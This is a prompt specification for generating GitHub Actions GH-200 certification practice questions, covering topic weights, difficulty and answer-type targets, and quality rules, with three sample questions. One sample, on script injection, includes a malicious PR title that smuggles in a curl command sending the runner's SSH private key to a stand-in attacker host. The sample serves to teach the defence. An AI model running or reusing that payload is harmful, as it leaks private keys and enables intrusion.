# GitHub Actions (GH-200) Exam Question Generator — Revised

## Executive Summary

This prompt guides generation of **100 high-quality exam-style questions** for the GitHub Actions GH-200 certification.
Questions will be scenario-based, cognitively rigorous, and aligned with the 19 topic files from the split GitHub Workflows Guide.
**The prompt supports iteration**: run it multiple times to generate different question sets with varied scenarios and distractors.

---

## Quick Reference

| Parameter | Value |
| --------- | ----- |
| **Total Questions** | 100 per iteration |
| **Topics** | 19 |
| **Difficulty Split** | 20% Easy / 60% Medium / 20% Hard |
| **Answer Types** | 55% `one` / 26% `many` / 12% `all` / 7% `none` |
| **Scenario-Based Minimum** | 70% (70+ questions) |
| **Options Per Question** | 4 (5 for complex questions) |
| **Security Minimum** | 11 questions (Topics 6, 7, 18) |
| **Enterprise Minimum** | 9 questions (Topics 8, 14, 17) |
| **Cross-Topic Minimum** | 5 questions |
| **Output File** | `quiz\gh-200-iteration-[N].md` |
| **Deduplication Source** | `quiz\gh-200.md` (if it exists) |
| **Default Iteration** | 1 (increment to regenerate a different set) |

---

## 1. Objective

Generate 100 multiple-choice certification exam questions that follows `exam-overview.md` GH-200 exam skill domain breakdown and weights

- Test practical knowledge of GitHub Actions workflows, runners, security, and enterprise features
- Avoid pure recall; emphasize application, analysis, and decision-making
- Reflect real-world scenarios and job responsibilities
- Maintain consistency with official GitHub documentation and exam standards
- Include rigorous distractors that capture common misconceptions
- **Support iteration**: Enable different question generation on subsequent runs (variation in scenarios, answer positions, distractor selection)

---

## 2. Source Material

### Primary Reference Files (19 topics)

All files located in: `github-actions\`

1. `01-GitHub-Actions-VS-Code-Extension.md` — Extension features, validation, local development
2. `02-Contextual-Information.md` — GitHub, env, secrets, job, runner, steps, matrix, inputs, needs, strategy contexts
3. `03-Context-Availability-Reference.md` — Context scope by workflow key, static vs. runtime evaluation, secret leakage
4. `04-Workflow-File-Structure.md` — File structure, jobs, steps, container, services, permissions, YAML anchors
5. `05-Workflow-Trigger-Events.md` — 26+ trigger events (push, pull_request, schedule, workflow_dispatch, etc.)
6. `06-Custom-Environment-Variables.md` — Workflow/job/step-level vars, secrets, contexts, GITHUB_OUTPUT, defaults
7. `07-Default-Environment-Variables.md` — Built-in vars (workflow info, runner info, API tokens, CI flag, debug mode)
8. `08-Environment-Protection-Rules.md` — Required reviewers, deployment branches, wait timers, custom rules
9. `09-Workflow-Artifacts.md` — Upload, download, retention, storage limits, metadata, releases
10. `10-Workflow-Caching.md` — Cache basics, multiple paths, language-specific strategies, advanced patterns
11. `11-Workflow-Sharing.md` — Reusable workflows, shared actions, starter templates, workflow status badges
12. `12-Workflow-Debugging.md` — Logs, RUNNER_DEBUG, workflow commands, performance profiling, advanced techniques
13. `13-Workflows-REST-API.md` — List workflows, list runs, get details, trigger, re-run, cancel, delete, list jobs/artifacts
14. `14-Reviewing-Deployments.md` — Environment configuration, review process, deployment review workflows, monitoring
15. `15-Creating-Publishing-Actions.md` — JavaScript/composite/Docker actions, marketplace publishing, versioning, distribution
16. `16-Managing-Runners.md` — Hosted runners, self-hosted setup, labels, organization, scaling, maintenance, best practices
17. `17-GitHub-Actions-Enterprise.md` — Org policies, access control, runner groups, IP allow lists, secrets hierarchy, audit logging
18. `18-Security-and-Optimization.md` — GITHUB_TOKEN lifecycle, OIDC, SHA pinning, script injection, trustworthy actions, attestations
19. `19-Common-Failures-Troubleshooting.md` — Authentication, dependencies, timeouts, syntax, runners, artifacts, caching, secrets, matrix, performance

### Deduplication Database

- **File**: `quiz\gh-200.md` (if exists in workspace; else skip deduplication check)
- **Purpose**: Avoid semantic duplication of previously generated questions

---

## 3. Question Generation Targets

### Total Output

- **Total Questions**: 100 questions
- **Distribution**: ~5 questions per topic file (allows for variable coverage by domain importance)

### Distribution by Topic (Recommended)

Total exactly 100.

| Topic # | Topic Name | Questions | Rationale |
| ------- | ---------- | --------- | --------- |
| 1 | VS Code Extension | 4 | Tools & features (foundational) |
| 2 | Contextual Information | 6 | Core knowledge; 10 context types |
| 3 | Context Availability | 5 | Static vs. runtime; advanced concept |
| 4 | Workflow File Structure | 7 | Fundamental; many properties to test |
| 5 | Trigger Events | 7 | 26+ events; common exam focus |
| 6 | Custom Env Vars | 5 | Practical, scenario-heavy |
| 7 | Default Env Vars | 5 | Reference knowledge; practical use |
| 8 | Environment Protection | 5 | Enterprise/security focus |
| 9 | Artifacts | 5 | Practical; common workflows |
| 10 | Caching | 5 | Performance optimization; strategy |
| 11 | Workflow Sharing | 5 | Reusability; marketplace |
| 12 | Debugging | 5 | Troubleshooting; real-world scenarios |
| 13 | REST API | 5 | Automation; advanced use |
| 14 | Deployment Review | 4 | Enterprise/governance |
| 15 | Creating/Publishing Actions | 5 | Advanced; marketplace |
| 16 | Managing Runners | 5 | Operational; enterprise focus |
| 17 | Enterprise Features | 5 | Policy, groups, audit; high exam weight |
| 18 | Security & Optimization | 7 | OIDC, script injection, SHA pinning; critical |
| 19 | Troubleshooting | 5 | Problem-solving; real scenarios |
| **TOTAL** | | **100** | |

---

## 4. Question Difficulty & Cognitive Levels

### Distribution by Difficulty

| Difficulty | % | Count | Cognitive Level | Example Focus |
| ---------- | --- | ----- | --------------- | -------------- |
| **Easy** | 20% | 20 | Recall + Comprehension | "What does this context contain?" |
| **Medium** | 60% | 60 | Application + Analysis | "Which trigger event should you use for...?" |
| **Hard** | 20% | 20 | Synthesis + Evaluation | "Identify the scenario where this approach fails..." |

### Cognitive Level Definitions

- **Recall/Comprehension** (Easy): Direct from guide; minimal reasoning
- **Application** (Medium): Apply knowledge to new situation; select correct tool
- **Analysis** (Medium-Hard): Break apart scenario; identify root cause or best practice
- **Synthesis** (Hard): Combine multiple concepts; design/optimize a solution
- **Evaluation** (Hard): Judge trade-offs; identify pitfalls or best practice

---

## 5. Answer Type Distribution

Distribute answer types across the 100 questions:

| Answer Type | % of 100 | Count | Definition |
| ----------- | -------- | ----- | --------- |
| `one` | 55% | 55 | Exactly one correct answer |
| `many` | 26% | 26 | Multiple correct answers (2–4) |
| `all` | 12% | 12 | All options are correct (rare but valid) |
| `none` | 7% | 7 | "Which is NOT true...?" or no correct answer |

### Implementation Notes

- **`one`**: Standard format; 4–5 options
- **`many`**: Clearly marked "Select all that apply"; 4–5 options
- **`all`**: Use sparingly; all 4 options must be defensibly correct
- **`none`**: Phrased as "Which of the following is NOT..." or "Which statement is FALSE..."

---

## 6. Answer Option Design

### General Principles

1. **Exactly 4 options** for all questions (some can have 5 if complex)
2. **Plausibility**: Each distractor should be chosen by someone with ~50% knowledge
3. **Logical grouping**: Similar wrong answers ≈ different wrong answers (mix it up)
4. **No "all of the above" or "none of the above"** unless explicitly required

### Distractor Strategy

| Distractor Type | Example | When to Use |
| --------------- | ------- | ----------- |
| **Partial knowledge** | Correct concept, wrong context | Most common |
| **Common misconception** | "Secrets are always available" | Security topics |
| **Off-by-one / precedence error** | Wrong behavior order | Workflow structure |
| **Alternative but wrong tool** | "Use workflow_dispatch instead" | Event selection |
| **Close but not best** | "This works but isn't recommended" | Best practices |

---

## 7. Question Template

```markdown
### Question [N] — [Domain]

**Difficulty**: Easy | Medium | Hard
**Answer Type**: one | many | all | none
**Topic**: [e.g., "GITHUB_TOKEN permissions", "Matrix strategies", "Runner groups"]

**Scenario** _(if applicable)_:
[2–3 sentences setting up a real-world situation]

**Question**:
[Clear, unambiguous question; avoid double negatives]

- A) [Plausible option]
- B) [Correct or correct option]
- C) [Plausible distractor]
- D) [Plausible distractor]
- E) [Optional; use only if needed for clarity]

---
```

### Key Template Rules

- **No "Choose the best answer"** — say "Which is correct?" or "Which statement is true?"
- **For `many` type**: Add **(Select all that apply)** after the question
- **Avoid vague language**: "sometimes", "usually", "might" — be specific
- **Double-check**: Question must be answerable from the guide alone
- **YAML code blocks**: Format workflow snippets as fenced ` ```yaml ` blocks; keep them concise (5–15 lines); focus the snippet on the concept being tested

---

### Sample Questions (Illustrative Examples)

The following examples demonstrate expected quality, format, and difficulty range.

---

#### Example 1 — Easy (`one`)

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Default Environment Variables (07)

**Question**:
Which default environment variable contains the GitHub REST API URL used by the current workflow run?

- A) `GITHUB_SERVER_URL`
- B) `GITHUB_API_URL`
- C) `GITHUB_GRAPHQL_URL`
- D) `GITHUB_TOKEN`

**Answer**: B — `GITHUB_API_URL` holds the REST API base URL (e.g., `https://api.github.com`). `GITHUB_SERVER_URL` is the web UI URL, `GITHUB_GRAPHQL_URL` is the GraphQL endpoint, and `GITHUB_TOKEN` is a credential, not a URL.

---

#### Example 2 — Medium (`many`)

**Difficulty**: Medium
**Answer Type**: many
**Topic**: Workflow Artifacts (09)

**Scenario**:
Your CI pipeline uploads test results and build binaries in a `build` job. A downstream `deploy` job downloads them. The deploy job intermittently reports that artifact downloads are empty or incomplete.

**Question** (Select all that apply):
Which actions would improve artifact reliability between jobs?

- A) Add `if: always()` to the upload step so artifacts are uploaded even on failure
- B) Pin `actions/upload-artifact` and `actions/download-artifact` to matching major versions
- C) Set `retention-days: 90` to prevent early expiration during long-running pipelines
- D) Replace `path: .` with a specific glob pattern targeting only required output files

**Answer**: B, D — Pinning to matching versions prevents API compatibility issues; a precise glob avoids uploading unnecessary files that can cause partial or inconsistent downloads. `if: always()` aids debugging but does not fix reliability when the build itself fails. `retention-days` controls expiry, not mid-run consistency.

---

#### Example 3 — Hard (`one`)

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Security & Optimization — Script Injection (18)

**Scenario**:
A workflow step processes user-controlled PR titles:

```yaml
- name: Print PR title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker creates a PR titled: `valid title"; curl https://attacker.com/?d=$(cat ~/.ssh/id_rsa); echo "`

**Question**:
Which mitigation correctly prevents script injection without disabling the step?

- A) Wrap the expression in single quotes: `echo 'PR: ${{ github.event.pull_request.title }}'`
- B) Use `${{ toJson(github.event.pull_request.title) }}` to JSON-encode the value inline
- C) Set the title as an environment variable and reference it as `$PR_TITLE` in the shell command
- D) Add `permissions: read-all` to the job to restrict token scope

**Answer**: C — Assigning the untrusted value to an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell prevents injection because the value is passed as data, never interpolated into the command string. A (single quotes) prevents variable expansion entirely. B (`toJson`) adds JSON encoding but does not prevent shell interpretation. D (permissions) limits the token scope but has no effect on command injection.

---

## 8. Answer Key Format

```markdown
---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
|----|-----------|-------------|--------|------------|
| 1 | B, D | [Brief rationale; 1–2 sentences] | [File name] | Medium |
| 2 | All | [Why all are correct] | [File name] | Hard |
| 3 | D | [Why D is correct; why others are wrong] | [File name] | Easy |
| ... | ... | ... | ... | ... |

```

### Answer Key Guidelines

- **Explanation**: ~2–3 sentences max; cite specific guide sections
- **Source**: Reference the topic file (e.g., "18-Security-and-Optimization.md")
- **Completeness**: Optionally explain each distractor: "A is wrong because..."

---

## 9. Quality Assurance Rules

### Clarity & Precision

- ✓ Each question is unambiguous; only one reasonable interpretation
- ✓ Scenario is realistic and reflects job responsibilities
- ✓ No grammatical errors, typos, or awkward phrasing
- ✗ Avoid: "Which of these may or may not..." (ambiguous)
- ✗ Avoid: Double negatives: "You should NOT avoid NOT using..."

### Exam Language & Phrasing

| ✓ Recommended | ✗ Avoid |
| ------------- | ------- |
| "You are required to..." | "You should..." |
| "Which is the best practice?" | "Which might be the best?" |
| "True or False: [Statement]" | "How true is...?" |
| "What does [X] do?" | "What might [X] possibly do?" |
| "Select all that apply" | "Which are sometimes correct?" |

### Deduplication

- **Check against `quiz\gh-200.md`** (if exists): Identify semantically similar questions
- **Avoid repeating** the same scenario structure more than 2–3 times
- **Vary the focus**: If one question tests "when to use matrix", next shouldn't repeat that exact concept

### Plausibility Check

For each distractor, ask: *Would a candidate with 50% knowledge pick this?*

- If yes → keep it
- If no → make it more plausible or replace

---

## 10. Domain-Specific Focus Areas

### Security & Tokenization (Topics 18, 6–7)

- GITHUB_TOKEN lifecycle: when available, scope, redaction
- OIDC token usage: cloud federation, subject claims, setup
- SHA pinning: why immutable commits matter; semver vs. SHA
- Script injection: shell quoting, sanitization, untrusted input
- Secret leakage: environment variables vs. hardcoding; masking limitations
- Trustworthy actions: assessment framework, pinning strategy

#### Minimum 11 questions on security topics

### Enterprise & Governance (Topics 17, 8, 14)

- Runner groups: permission model, scaling, cost optimization
- IP allow lists: use cases, configuration
- Secrets hierarchy: org vs. repo vs. environment scope
- Audit logging: event types, streaming, compliance
- Environment protection rules: required reviewers, wait timers, custom rules
- Deployment review workflows: pause, approve, monitor

#### Minimum 9 questions on enterprise topics

### Real-World Scenarios (Topics 5, 9–12, 19)

- Workflow design: trigger selection, event payload
- Matrix builds: combinations, fail-fast, job indexing
- Artifact workflows: upload from build, download in another job
- Caching strategy: dependency selection, cache keys, miss handling
- Debugging: log streaming, RUNNER_DEBUG, slow step identification
- Troubleshooting: common errors, root cause, solutions

#### Minimum 37 questions scenario-based

### Advanced & Synthesis (All topics)

- Trade-off decisions: "You need X, Y, Z. Which approach is best?"
- Architecture decisions: "Design a workflow that..."
- Optimization: "How can you reduce execution time?"
- Error recovery: "An artifact upload fails midway; what happens?"

#### Minimum 14 questions requiring synthesis/evaluation

---

## 11. Special Instructions & Rules

### SHA Pinning & Immutability

- **Include at least 1 question** on pinning actions to full commit SHAs
- Focus on: why, when, trade-offs between SHA and semver
- Test understanding of: `@v2` vs. `@abc123def` vs. `@refs/tags/v2.0.0`

### Script Injection & Security

- **Include at least 1 question** on identifying/preventing script injection
- Scenarios: environment variable manipulation, dynamic step selection, user input
- Test: proper quoting, sanitization functions, risk assessment

### Matrix & Job Dependencies

- **Include at least 1 question** on matrix combinations and fail-fast behavior
- Scenarios: 3×2×2 matrix → job counts; conditional matrix values; job indices
- Test: `strategy.job-index`, `strategy.job-total`, fail-fast implications

### OIDC & Cloud Federation

- **Include at least 1 question** on OIDC token setup and usage
- Focus on: AWS, Azure, GCP federation; subject claims; trust relationships
- Test: when to use OIDC vs. secrets; benefits (no long-lived secrets)

### REST API Automation

- **Include at least 1 question** on API-driven workflows
- Scenarios: trigger workflow via API, list failed runs, re-run selectively
- Test: API rate limits, authentication, pagination

### Contextual Scenarios to Avoid Repeating

- Don't ask "What is `github.sha`?" 5 times (test understanding, not recall)
- Instead: "Your workflow needs the commit SHA on PR head. Where do you get it?" (analysis)
- Vary the job: "You're in a job that depends on another. How do you access a previous job's output?"

### Wording Style for Clarity

- **Use imperative mood**: "You need to..." not "One might..."
- **Specify constraints**: "In a reusable workflow called by another workflow, which contexts are available?"
- **Base on real scenarios**: "Your CI is slow; which caching strategy..."

### YAML Code Blocks in Questions

- **Minimum 10 questions** should include a relevant YAML workflow snippet
- Keep code blocks to 5–15 lines; focus the snippet on the concept under test
- Use ` ```yaml ` fenced blocks for all workflow fragments
- Label snippets clearly: "workflow fragment", "job definition", or "step definition"
- For error-identification questions, intentionally embed a subtle bug in the YAML; do not explain it in the scenario
- Use realistic `runs-on`, action references (with SHA pins or version tags), and `env` / `with` blocks to reflect real-world patterns

**Example snippet format**:

```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
```

### Cross-Topic Synthesis Questions

At least **5 questions** must combine concepts from two or more topic files. These reflect the real exam's synthesis challenge and cannot be answered by recalling a single section.

**Recommended Topic Combinations**:

| Topics | Example Focus |
| ------ | ------------- |
| 2 + 18 (Context + Security) | Which context expression leaks a secret value into workflow logs? |
| 5 + 8 (Triggers + Environments) | Which trigger event bypasses environment protection rules? |
| 9 + 10 (Artifacts + Caching) | When should you prefer a cache over an artifact for build output? |
| 15 + 18 (Custom Actions + Security) | Which action reference strategy is safest for a third-party action? |
| 16 + 17 (Runners + Enterprise) | How does a runner group restrict which workflows can use a self-hosted runner? |
| 4 + 6 (Structure + Variables) | At which scope does this variable definition take precedence? |
| 11 + 5 (Workflow Sharing + Triggers) | Which trigger event is unavailable when using a reusable workflow caller? |
| 12 + 19 (Debugging + Troubleshooting) | Which debug technique identifies the specific step that introduced the timeout? |
| 3 + 2 (Context Availability + Context Info) | Which context is only available at workflow level, not within a step? |
| 18 + 7 (Security + Default Vars) | Which default variable must never be echoed to a public log? |

**Tag cross-topic questions** in the template with all applicable topic numbers:

```markdown
**Topic**: Caching (10) + Artifacts (09) — Cross-Topic
```

---

## 12. Question Structure & Balance

### By Complexity & Scenario Depth

| Question Type | % | Example | Difficulty |
| ------------- | - | ------- | ---------- |
| Single concept | 20% | "What does `runner.os` contain?" | Easy |
| Scenario + decision | 50% | "Your build has 3 stages; which trigger should...?" | Medium |
| Multi-concept + trade-off | 20% | "Compare: caching vs. artifacts; when use each?" | Hard |
| Edge case / error | 10% | "If two jobs write same artifact, what happens?" | Hard |

### By Answer Distribution (Across 100 Questions)

- A, B, C, D should each appear as correct answer ~25 times (balanced)
- Avoid pattern: correct answer is always B or D
- Check randomness of `one` vs. `many` vs. `all` vs. `none` distribution

---

## 13. Output File Specification

### File Name

- **Primary**: `quiz\gh-200-new.md`
- **Alternative** (if appending): Append to `quiz\gh-200.md` with date marker and "NEW QUESTIONS (Generated [DATE])" section

### File Structure

```plaintext
# GH-200 Certification Exam — Practice Questions

## Questions (100 total — Iteration [N])

### Question 1 — [Domain]
[Full question with options]

### Question 2 — [Domain]
[Full question with options]

...

---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
...

---

## Statistics

- **Total Questions**: 100
- **Iteration Number**: [N] (1 for first run; increment for different question sets)
- **Difficulty Distribution**: 20 Easy, 60 Medium, 20 Hard
- **Answer Type Distribution**: 55 one, 26 many, 12 all, 7 none
- **Generation Date**: [Date]
- **Topics Covered**: All 19
- **Scenario-Based**: ~70 questions (70%+)
- **Average Question Length**: [X] words
- **Deduplication**: Checked against all previous iterations

```

---

## 14. Process Workflow (For Implementation)

1. **Preparation**

   - Load all 19 topic files
   - Load `quiz\gh-200.md` (if exists) for deduplication
   - Load/read ITERATION_NUMBER (default: 1) for question variation
   - Organize by topic; target ~5 questions per topic

2. **Generation Pass 1: Easy (20 questions)**

   - Generate recall/comprehension questions
   - Direct from guide content
   - Distribute across topics
   - Vary scenarios by iteration number (seed RNG with iteration)

3. **Generation Pass 2: Medium (60 questions)**

   - Scenario-based; application/analysis
   - Mix of decision-making, bug-finding, best-practice selection
   - Prioritize enterprise, security, and real-world patterns
   - Randomize distractor order by iteration (shuffle wrong answers)

4. **Generation Pass 3: Hard (20 questions)**

   - Synthesis, evaluation, trade-offs
   - Multi-concept combinations
   - Edge cases and error recovery
   - Vary edge cases tested by iteration

5. **Quality Review**

   - Check clarity, grammar, ambiguity
   - Verify options are plausible
   - Confirm answer key matches options
   - Confirm no semantic duplication with previous iterations

6. **Finalization**

   - Balance answer distribution (A/B/C/D)
   - Verify percentages (55% one, 26% many, etc.)
   - Generate statistics block
   - Append to `quiz\gh-200-all-iterations.md` OR export to `quiz\gh-200-iteration-[N].md`
   - Document iteration number and generation timestamp

---

## 15. Defaults Applied & Assumptions

| Item | Default | Rationale |
| ---- | ------- | --------- |
| **Total Questions** | 100 | Focused practice set; comprehensive exam coverage |
| **Options per Question** | 4 (up to 5) | Standard format; reduces cognitive load |
| **Difficulty Split** | 20/60/20 | Typical exam distribution |
| **Answer Types** | 55/26/12/7 | Realistic mix; mostly `one`, some `many`, rare `all`/`none` |
| **Scenario Weight** | 70% | Practical exam focus; tests application not recall |
| **Domain Focus** | Enterprise, Security, Real Scenarios | GH-200 exam priorities |
| **Deduplication** | Checked | Avoid duplicate concepts across iterations |
| **Source Verification** | All 19 topics | Comprehensive coverage |
| **Iteration Number** | 1 (default) | Seed for randomization; increment to generate new question set |

---

## 16. Known Constraints & Limitations

- **Time**: Generation may take significant effort; quality over speed
- **Deduplication**: Manual if `quiz\gh-200.md` doesn't exist in standard format
- **Scenario Complexity**: Some scenarios may require long setups; balance with clarity
- **Answer Key Brevity**: Keep explanations concise (2–3 sentences) but complete
- **Topic Imbalance**: Topics 2, 4, 5, 18 naturally have more exam weight; adjust distribution as needed

---

## 17. Iteration & Randomization Strategy

> See **`question-prompt-reference.md`** (Section 17) for full iteration mechanics, randomization pseudocode, output file strategy, and deduplication guidance.

**Quick summary**: Pass `ITERATION_NUMBER` (default: 1) to seed scenario selection, distractor shuffling, and edge-case variation. Increment to generate a different question set. Output to `quiz\gh-200-iteration-[N].md`.

---

## 18. Success Criteria

✓ 100 questions generated per iteration
✓ 0 duplicates within iteration; deduplication tracked across iterations
✓ 70%+ scenario-based (not pure recall)
✓ All questions answerable from guide alone
✓ Clear, unambiguous wording
✓ Plausible distractors for each question
✓ Balanced answer distribution (A/B/C/D ~25 each for 100 questions)
✓ Proper answer key with explanations
✓ Focus areas met (security: 11+, enterprise: 9+, scenarios: 37+, synthesis: 14+)
✓ Statistics block complete with iteration number
✓ Different questions generated on subsequent iterations (verified by spot check of 5–10 questions)
✓ Iteration number stored and documented in output file

---

## Companion Files

This file is the **core generation spec**. Two companion files contain supplementary material:

| File | Purpose | When to Attach |
| ---- | ------- | -------------- |
| `question-prompt-examples.md` | Sample questions (Easy/Medium/Hard), distractor bank, common pitfalls, topic misconceptions | Attach when starting a generation session for format guidance |
| `question-prompt-reference.md` | Iteration strategy, scenario pool, answer distribution table, glossary, customization guide, maintenance schedule | Attach when fine-tuning, scaling, or maintaining the question bank |

**Typical usage**: Attach `question-prompt.md` + `question-prompt-examples.md` when generating questions. Add `question-prompt-reference.md` for deeper context.
